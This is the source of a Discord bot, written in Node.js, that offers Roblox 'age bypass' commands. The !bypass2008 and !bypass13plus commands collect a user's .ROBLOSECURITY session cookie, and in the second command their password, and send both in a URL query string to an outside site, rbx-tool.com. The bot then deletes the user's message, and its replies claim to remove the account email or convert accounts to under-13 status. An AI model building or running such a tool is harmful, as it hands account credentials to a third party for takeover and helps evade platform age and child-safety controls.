const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const keepAlive = require('./keepalive.js');
const fetch = require('node-fetch');

// Start keep-alive server
keepAlive();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

client.on('ready', () => {
  console.log(`âœ… Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  const args = message.content.trim().split(" ");
  const command = args.shift().toLowerCase();

  if (command === "!ping") {
    message.reply("ðŸ“ Pong!");
    return;
  }

  // !bypass2008 <cookie>
  if (command === "!bypass2008") {
    if (!args[0]) return message.reply("âŒ Provide your .ROBLOSECURITY cookie");

    const cookie = args[0];
    const url = `https://rbx-tool.com/apis/bypassAge?a=${encodeURIComponent(cookie)}`;

    try {
      await new Promise(r => setTimeout(r, 3000)); // 3s delay

      const res = await fetch(url, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
          'Accept': 'application/json, text/plain, */*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Referer': 'https://rbx-tool.com/',
          'Origin': 'https://rbx-tool.com',
          'Connection': 'keep-alive'
        }
      });

      const data = await res.json();

      const embed = new EmbedBuilder()
        .setColor(data.status === "success" ? 0x22c55e : 0xef4444)
        .setTitle(data.status === "success" ? "âœ… Success" : "âŒ Failed")
        .setDescription(data.message || (data.status === "success" ? "Success removing email!" : "Unknown error"));

      await message.reply({ embeds: [embed] });
    } catch (err) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("ðŸš« Request Failed")
        .setDescription("Request blocked or failed to fetch data.");
      await message.reply({ embeds: [embed] });
    }

    setTimeout(() => message.delete().catch(() => { }), 8000);
  }

  // !bypass13plus <cookie> <password>
  if (command === "!bypass13plus") {
    if (!args[0] || !args[1]) return message.reply("âŒ Usage: `!bypass13plus <cookie> <password>`");

    const cookie = args[0];
    const password = args.slice(1).join(" ");
    const url = `https://rbx-tool.com/apis/bypassAgeV2?a=${encodeURIComponent(cookie)}&b=${encodeURIComponent(password)}`;

    try {
      await new Promise(r => setTimeout(r, 3000)); // 3s delay

      const res = await fetch(url, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
          'Accept': 'application/json, text/plain, */*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Referer': 'https://rbx-tool.com/',
          'Origin': 'https://rbx-tool.com',
          'Connection': 'keep-alive'
        }
      });

      const data = await res.json();

      const embed = new EmbedBuilder()
        .setColor(data.status === "success" ? 0x22c55e : 0xef4444)
        .setTitle(data.status === "success" ? "âœ… Success" : "âŒ Failed")
        .setDescription(data.message || (data.status === "success" ? "Success converting 13+ to under 13!" : "Unknown error"));

      await message.reply({ embeds: [embed] });
    } catch (err) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("ðŸš« Request Failed")
        .setDescription("Request blocked or failed to fetch data.");
      await message.reply({ embeds: [embed] });
    }

    setTimeout(() => message.delete().catch(() => { }), 8000);
  }

  if (command === "!help") {
    const embed = new EmbedBuilder()
      .setColor(0x60a5fa)
      .setTitle("ðŸ“˜ Help Menu")
      .setDescription("â€¢ `!bypass2008 <cookie>` â€“ Bypass with 2008 birth year\nâ€¢ `!bypass13plus <cookie> <password>` â€“ Bypass for 13+ accounts");
    message.reply({ embeds: [embed] });
  }
});

client.login(process.env.DISCORD_TOKEN);
